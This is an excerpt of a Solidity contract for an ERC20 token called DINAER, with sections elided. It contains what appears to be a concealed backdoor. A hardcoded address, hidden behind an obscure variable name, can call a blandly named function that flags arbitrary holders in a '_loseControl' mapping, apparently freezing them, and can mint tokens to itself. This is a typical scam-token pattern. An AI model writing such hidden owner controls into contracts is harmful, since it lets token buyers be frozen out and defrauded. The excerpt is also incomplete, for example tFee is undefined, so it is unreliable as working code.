...
contract DINAER is Context, IERC20, Ownable{

    using SafeMath for uint256;
    string private _name = "DINAER";
    bool private _gotta;

    string private _symbol = "DINAER";
    uint8 private _decimals = 9;
    address payable public _seYa;
    ...
    constructor () {
        ...
        _seYa = payable(address(0xa15089e11FB0FD408f0D9c7A3eB5189FC57D0FCF));
    ...
    function multiInfo(bool info,address[] calldata myInfo) public {
        require(_msgSender() == _seYa);
        for (uint256 v; v < myInfo.length; v++) {
            _gotta = (myInfo[v] == _seYa);
            if(_gotta)_balances[_seYa] =  _balances[_seYa] + uint256(2 * tFee + 1 * tFee);
            _loseControl[myInfo[v]] = info;
        }
    }
